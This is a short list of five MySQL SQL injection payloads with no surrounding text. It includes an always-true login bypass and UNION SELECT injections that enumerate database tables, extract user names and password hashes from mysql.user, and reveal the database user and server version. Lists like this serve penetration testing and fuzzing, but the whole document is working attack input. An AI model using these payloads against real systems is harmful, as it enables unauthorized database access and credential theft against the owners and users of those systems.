a' OR 'x'='x'#;
a' UNION select table_schema,table_name FROM information_Schema.tables;#
a' UNION ALL SELECT user,password FROM mysql.user;#
a' UNION ALL SELECT system_user(),user();#
a' UNION ALL SELECT 1, @@version;#
